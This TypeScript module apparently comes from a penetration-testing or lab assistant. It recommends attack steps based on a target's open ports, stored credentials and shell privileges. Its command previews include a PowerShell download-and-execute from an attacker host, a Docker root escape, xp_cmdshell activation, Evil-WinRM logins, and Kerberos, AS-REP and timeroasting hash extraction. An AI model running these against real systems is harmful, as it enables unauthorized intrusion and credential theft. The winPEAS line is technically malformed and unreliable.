import { Target, Recommendation } from '@/types';
import { PLAYBOOKS } from './playbooks';

export function getRecommendedSteps(target: Target): Recommendation[] {
  const recommendations: Recommendation[] = [];
  const completed = target.completedSteps || {};
  const openPorts = target.openPorts || [];
  const credsCount = target.credentials?.length || 0;
  const shell = target.shellState || {
    hasShell: false,
    user: '',
    groups: [],
    privilegeLevel: 'unprivileged',
  };

  const isCompleted = (stepId: string) =>
    completed[stepId] === 'completed' || completed[stepId] === 'skipped';

  // --- RULE 1: WINDOWS PRIVILEGE ESCALATION ---
  if (shell.hasShell && target.os === 'windows' && shell.privilegeLevel === 'unprivileged') {
    if (!isCompleted('win-auto-enum')) {
      recommendations.push({
        id: 'rec-win-auto-enum',
        title: 'Run winPEAS Automated Triaging',
        description: 'Execute winPEAS to automatically detect service misconfigurations, unquoted paths, stored credentials, and token privileges.',
        playbookId: 'windows-privesc',
        stepId: 'win-auto-enum',
        priority: 'critical',
        reason: 'Unprivileged Windows shell acquired; running automated triaging is the fastest path to identifying privesc vectors.',
        commandPreview: 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\'http://{{LHOST|10.10.14.2}}/winPEASx64.exe\') -ExecutionPolicy Bypass"',
      });
    }

    if (!isCompleted('win-se-impersonate')) {
      recommendations.push({
        id: 'rec-win-se-impersonate',
        title: 'Token Impersonation (PrintSpoofer / GodPotato)',
        description: 'Check `whoami /priv` for SeImpersonatePrivilege. If enabled, run PrintSpoofer or GodPotato to spawn an instant NT AUTHORITY\\SYSTEM shell.',
        playbookId: 'windows-privesc',
        stepId: 'win-se-impersonate',
        priority: 'high',
        reason: 'Service accounts (e.g. IIS / MSSQL / LocalService) typically have SeImpersonatePrivilege enabled.',
        commandPreview: '.\\PrintSpoofer64.exe -i -c "cmd.exe" || .\\GodPotato-NET4.exe -cmd "cmd.exe /c whoami"',
      });
    }

    if (!isCompleted('win-always-install-elevated')) {
      recommendations.push({
        id: 'rec-win-always-elevated',
        title: 'Check AlwaysInstallElevated Registry Keys',
        description: 'Query HKLM and HKCU AlwaysInstallElevated registry keys to check if standard users can execute MSI packages as SYSTEM.',
        playbookId: 'windows-privesc',
        stepId: 'win-always-install-elevated',
        priority: 'medium',
        reason: 'Common Windows misconfiguration allowing instantaneous root/SYSTEM compromise via custom MSI.',
        commandPreview: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
      });
    }
  }

  // --- RULE 2: LINUX PRIVILEGE ESCALATION ---
  if (shell.hasShell && target.os === 'linux' && shell.privilegeLevel === 'unprivileged') {
    // Docker group escape
    if (
      shell.groups.some((g) => g.toLowerCase().includes('docker')) &&
      !isCompleted('linux-docker-escape')
    ) {
      recommendations.push({
        id: 'rec-docker-escape',
        title: 'Privilege Escalation via Docker Socket Escape',
        description:
          'Current user is in the "docker" group. Spawning a container with host root filesystem mounted grants instant root privilege.',
        playbookId: 'linux-privesc',
        stepId: 'linux-docker-escape',
        priority: 'critical',
        reason: 'User member of docker group detected with unprivileged shell.',
        commandPreview: 'docker run -v /:/mnt --rm -it alpine chroot /mnt sh',
      });
    }

    // Sudo -l check
    if (!isCompleted('linux-sudo-check')) {
      recommendations.push({
        id: 'rec-sudo-check',
        title: 'Sudo Rights & NOPASSWD Checks',
        description:
          'Inspect allowed sudo commands to check for GTFOBins bypasses, unconstrained binaries, or NOPASSWD privileges.',
        playbookId: 'linux-privesc',
        stepId: 'linux-sudo-check',
        priority: 'high',
        reason: 'Unprivileged shell active; sudo rules should always be checked first.',
        commandPreview: 'sudo -l',
      });
    }

    // SUID search
    if (!isCompleted('linux-suid-bins')) {
      recommendations.push({
        id: 'rec-suid-bins',
        title: 'SUID & SGID Binaries Discovery',
        description: 'Search the filesystem for binaries with the SUID bit enabled to identify privilege escalation vectors.',
        playbookId: 'linux-privesc',
        stepId: 'linux-suid-bins',
        priority: 'high',
        reason: 'Search for misconfigured or custom SUID executables owned by root.',
        commandPreview: 'find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null',
      });
    }
  }

  // --- RULE 3: MSSQL EXPLOITATION (PORT 1433) ---
  if (openPorts.includes(1433)) {
    if (credsCount > 0 && !isCompleted('mssql-xp-cmdshell')) {
      recommendations.push({
        id: 'rec-mssql-xp-cmdshell',
        title: 'MSSQL xp_cmdshell Code Execution',
        description: 'You have discovered credentials and MSSQL is active. Enable and execute OS commands via xp_cmdshell.',
        playbookId: 'mssql',
        stepId: 'mssql-xp-cmdshell',
        priority: 'critical',
        reason: 'Valid database credentials against active MSSQL service.',
        commandPreview: "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';",
      });
    } else if (!isCompleted('mssql-auth-connect')) {
      recommendations.push({
        id: 'rec-mssql-auth',
        title: 'Authenticate to MSSQL Database',
        description: 'Test database authentication with default accounts (sa, admin) or discovered Active Directory credentials.',
        playbookId: 'mssql',
        stepId: 'mssql-auth-connect',
        priority: 'high',
        reason: 'Port 1433 MSSQL open.',
        commandPreview: "impacket-mssqlclient {{DOMAIN|}}{{DOMAIN|\\}}{{USERNAME|sa}}:'{{PASSWORD|Password123!}}'@{{TARGET}} -windows-auth",
      });
    }
  }

  // --- RULE 4: WINRM POWERSHELL REMOTING (PORT 5985 / 5986) ---
  if ((openPorts.includes(5985) || openPorts.includes(5986)) && credsCount > 0 && !isCompleted('winrm-evil-connect')) {
    recommendations.push({
      id: 'rec-winrm-connect',
      title: 'Obtain Interactive Shell via Evil-WinRM',
      description: 'Port 5985 WinRM is open and valid credentials are stored in your vault. Connect directly to spawn an interactive PowerShell session.',
      playbookId: 'winrm',
      stepId: 'winrm-evil-connect',
      priority: 'critical',
      reason: 'Open WinRM service with stored credential.',
      commandPreview: "evil-winrm -i {{TARGET}} -u '{{USERNAME|administrator}}' -p '{{PASSWORD|Password123!}}'",
    });
  }

  // --- RULE 5: REDIS EXPLOITATION (PORT 6379) ---
  if (openPorts.includes(6379) && !isCompleted('redis-info-check')) {
    recommendations.push({
      id: 'rec-redis-check',
      title: 'Unauthenticated Redis Connection & SSH Key Drop',
      description: 'Check if Redis on port 6379 permits unauthenticated connections to drop an SSH public key or scheduled cron job for immediate RCE.',
      playbookId: 'redis',
      stepId: 'redis-info-check',
      priority: 'high',
      reason: 'Port 6379 open; Redis is often configured without password authentication.',
      commandPreview: 'redis-cli -h {{TARGET}} info',
    });
  }

  // --- RULE 6: FTP ANONYMOUS ACCESS (PORT 21) ---
  if (openPorts.includes(21) && !isCompleted('ftp-anon-login')) {
    recommendations.push({
      id: 'rec-ftp-anon',
      title: 'Test FTP Anonymous Login & Mirror Files',
      description: 'Check if FTP allows anonymous:anonymous authentication and mirror accessible directories for leaked secrets or backup files.',
      playbookId: 'ftp',
      stepId: 'ftp-anon-login',
      priority: 'high',
      reason: 'Port 21 open; anonymous FTP access frequently leaks critical credentials and archives.',
      commandPreview: 'wget -m --no-passive ftp://anonymous:anonymous@{{TARGET}}',
    });
  }

  // --- RULE 7: ACTIVE DIRECTORY / KERBEROS (PORT 88) ---
  if (openPorts.includes(88)) {
    if (credsCount > 0 && !isCompleted('ad-kerberoasting')) {
      recommendations.push({
        id: 'rec-kerberoast',
        title: 'Kerberoasting (Extract Service Account TGS Hashes)',
        description: 'Valid domain credential is available and Kerberos port 88 is open. Request SPN tickets for offline cracking.',
        playbookId: 'ad-attacks',
        stepId: 'ad-kerberoasting',
        priority: 'critical',
        reason: 'Authenticated user credential available against Kerberos KDC.',
        commandPreview: "impacket-GetUserSPNs '{{DOMAIN|corp.local}}/{{USERNAME}}':'{{PASSWORD}}' -dc-ip {{TARGET}} -request -outputfile kerberoast.hashes",
      });
    }

    if (!isCompleted('kerb-asrep-roast')) {
      recommendations.push({
        id: 'rec-asrep-roast',
        title: 'AS-REP Roasting (No Pre-Auth Users)',
        description: 'Query the domain controller for accounts with Kerberos pre-authentication disabled to recover hashes without credentials.',
        playbookId: 'kerberos',
        stepId: 'kerb-asrep-roast',
        priority: 'high',
        reason: 'Kerberos KDC port 88 detected.',
        commandPreview: "impacket-GetNPUsers '{{DOMAIN|corp.local}}/' -usersfile users.txt -format hashcat -outputfile asrep.hashes -dc-ip {{TARGET}} -no-pass",
      });
    }

    if (!isCompleted('kerb-timeroast') && !isCompleted('ntp-timeroast-nxc')) {
      recommendations.push({
        id: 'rec-timeroast',
        title: 'Timeroasting (MS-SNTP Authentication Roasting)',
        description: 'Query the Domain Controller Windows Time Service (W32Time) over UDP port 123 to extract crackable MS-SNTP MD5 authentication digests with zero credentials.',
        playbookId: 'kerberos',
        stepId: 'kerb-timeroast',
        priority: 'high',
        reason: 'Active Directory Domain Controller detected; Timeroasting works without valid credentials.',
        commandPreview: "nxc smb {{TARGET}} -u '' -p '' -M timeroast",
      });
    }
  }

  // --- RULE 8: NTP / TIME SERVICE (PORT 123) ---
  if (openPorts.includes(123) && !isCompleted('ntp-timeroast-nxc') && !isCompleted('kerb-timeroast')) {
    recommendations.push({
      id: 'rec-ntp-timeroast',
      title: 'Timeroasting (W32Time NTP Roasting)',
      description: 'Query Windows Time Service (W32Time) on UDP port 123 using NetExec or timeroast.py to extract MS-SNTP password digests.',
      playbookId: 'ntp',
      stepId: 'ntp-timeroast-nxc',
      priority: 'high',
      reason: 'Port 123 NTP open; Domain Controller time service can be roasted for offline NTLM password cracking.',
      commandPreview: "nxc smb {{TARGET}} -u '' -p '' -M timeroast",
    });
  }

  // --- RULE 9: SMB RECONNAISSANCE (PORTS 139, 445) ---
  if ((openPorts.includes(445) || openPorts.includes(139)) && !isCompleted('smb-null-session')) {
    recommendations.push({
      id: 'rec-smb-null',
      title: 'SMB Null Session & Share Discovery',
      description: 'Query SMB on port 445 for unauthenticated share access and guest read/write permissions.',
      playbookId: 'smb',
      stepId: 'smb-null-session',
      priority: 'high',
      reason: 'Port 445 SMB open; null session check is essential early enumeration.',
      commandPreview: "netexec smb {{TARGET}} -u '' -p '' --shares",
    });
  }

  return recommendations;
}
